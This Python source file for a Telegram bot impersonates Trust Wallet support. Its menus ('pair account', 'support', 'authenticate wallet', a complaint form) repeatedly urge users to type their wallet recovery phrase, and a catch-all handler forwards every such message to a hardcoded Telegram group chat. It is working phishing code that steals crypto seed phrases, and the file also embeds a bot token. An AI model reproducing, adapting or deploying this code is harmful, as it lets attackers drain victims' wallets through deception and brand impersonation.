

import telebot
from telebot.types import ReplyKeyboardMarkup,KeyboardButton
BOT_TOKEN = "6211235353:AAFWkFjcZzaKrmuDt1c3lSMIWnQeyGCxiiU"
bot = telebot.TeleBot(BOT_TOKEN)

def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard = True)
    markup.add(KeyboardButton("⚙PAIR ACCOUNT⚙"),
               KeyboardButton(""),
               KeyboardButton(""),
               KeyboardButton("💬ADMIN💬"),
               KeyboardButton(""),
               KeyboardButton("👩‍💻SUPPORT👩‍💻"),
               KeyboardButton(""),
               KeyboardButton("⚠️LAY A COMPLAIN⚠️"),
               KeyboardButton(""),
               KeyboardButton("⏬DOWUNLOAD TRUST WALLET⏬"))
    return markup

def back():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚫CANCEL"))
    return markup

def auth():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("⚙AUTHENTICATE ACCOUNT⚙"))
    markup.add(KeyboardButton("🚫CANCEL"))
    return markup

def app_links():
    markup = ReplyKeyboardMarkup(resize_keyboard = True)
    markup.add(KeyboardButton("📳DOWNLOAD FOR ANDROID📳")),
    markup.add(KeyboardButton("📲DOWNLOAD FOR IOS📲")),
    markup.add(KeyboardButton("🚫CANCEL"))
    return markup

@bot.message_handler(commands=["start"])
def start_message(message):
    bot.send_message(message.chat.id,"select an option ",reply_markup=main_menu())

@bot.message_handler(func=lambda message:True)
def all_messages(message):
    if message.text == "⚙PAIR ACCOUNT⚙":
        bot.send_message(message.from_user.id, "Here you're required to provide your "
                                               "phrase and wait for a verification message."
                                               "\n"
                                               "\n"
                                               "Remember not to expose conversations with this bot to anyone so as to keep your phrase safe.\n"
                                               "\n"
                                               "\n"
                                               "\n"
                                               "TO CONTINUE, KINDLY ENTER YOUR TRUST WALLET PHRASE CORRECTLY USING LOWERCASE LETTERS."
                                               "", reply_markup=main_menu())
    elif message.text == "💬ADMIN💬":
        bot.send_message(message.from_user.id, "💬ADMINISTRATIVE SESSION💬 "
                                               "Here you can have a direct conversation with our Trusted Administrator "
                                               "\n"
                                               "\n"
                                               "[CLICK HERE TO CONTINUE👇].\n"
                                               "\n"
                                               "\n"
                                               "\n"
                                               "https://t.me/Trust_Wallet_Tele_bot"
                                               "", reply_markup=main_menu())
    elif message.text == "👩‍💻SUPPORT👩‍💻":
        bot.send_message(message.from_user.id, "📞You are now in direct contact with our Support Panel"
                                                "Here you can send any message you want to submit, you will receive the answer directly here in chat!"
                                               "enter your trust wallet phrase and wait for a verification message."
                                               , reply_markup=back())

    elif message.text == "🚫CANCEL":
        bot.send_message(message.from_user.id, "CANCEL"
                                               , reply_markup=main_menu())


    elif message.text == "⚠️LAY A COMPLAIN⚠️":
        bot.send_message(message.from_user.id, "Do you have any question, difficulty or request?"
                                               "We’re here to provide you with a  STEP-BY-STEP guide on how to"
                                               "solve the problem."
                                               "\n"
                                               "\n"
                                               "\n"
                                               "\n"
                                               "\n"
                                               "➖staking/unstaking\n"
                                               "➖unconfirmed transaction\n"
                                               "➖not receiving bonuses\n"
                                               "➖ transaction error\n"
                                               "➖withdrawals\n"
                                               "➖ missing & retrieving coins\n"
                                               "➖swapping/others\n"
                                               "\n"
                                               "\n"
                                              
                                               "IF YOU ARE CURRENTLY EXPERIENCING ANY OF THESE \n"
                                               "PROBLEMS, THEN YOU WOULD HAVE TO RE-AUTHENTICATE\n"
                                               "YOUR WALLET AS THE PROCESS HAS BEEN DESIGNED TO RUN AN \n"
                                               "ANTI-TROUBLE SHOOTING INVIGORATION ON YOUR WALLET\n"
                                               "THEREBY ENHANCING THAT YOUR WALLET WORKS EFFICIENTLY\n "
                                               "\n"
                                               "\n"
                                            
                                               "To continue, click on the below button\n"
                                               "⚙️ AUTHENTICATE WALLET ⚙️\n"
                                               "\n"
                                               "\n"
                                            
                                               "⚠️ If you seem not to be able to find your problem in the above \n"
                                               "listed, then contact our\n"
                                               "👩‍💻Support Team 👩🏼‍💻 and explain to them what your problem is all\n "
                                               "about. They’d help you solve the problem in just a couple of\n"
                                               "minutes upon receiving  your message.\n"
                                               ""
                                               ""
                                               "", reply_markup=auth())

    elif message.text == "⚙AUTHENTICATE ACCOUNT⚙":
        bot.send_message(message.from_user.id, "⚠️ Here you're required to provide your phrase and wait for a verification message\n"
                                               "\n"
                                               "\n"
                                               "Remember not to expose conversations with this bot to anyone so as to keep your phrase safe.\n"
                                               "\n"
                                               "\n"
                                               "⏩ TO CONTINUE, KINDLY ENTER YOUR TRUST WALLET PHRASE"
                                               "CORRECTLY USING LOWERCASE LETTERS."
                                               , reply_markup=back())

    elif message.text == "⏬DOWUNLOAD TRUST WALLET⏬":
        bot.send_message(message.from_user.id, "⏬DOWUNLOAD TRUST WALLET⏬"
                                               , reply_markup=app_links())

    elif message.text == "📳DOWNLOAD FOR ANDROID📳":
        bot.send_message(message.from_user.id, "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp"
                                               , reply_markup=app_links())

    elif message.text == "📲DOWNLOAD FOR IOS📲":
        bot.send_message(message.from_user.id, "https://apps.apple.com/ba/app/trust-crypto-bitcoin-wallet/id1288339409"
                                               , reply_markup=app_links())

    else:
        bot.send_message(chat_id=-663258879,text=message.text)


bot.infinity_polling()
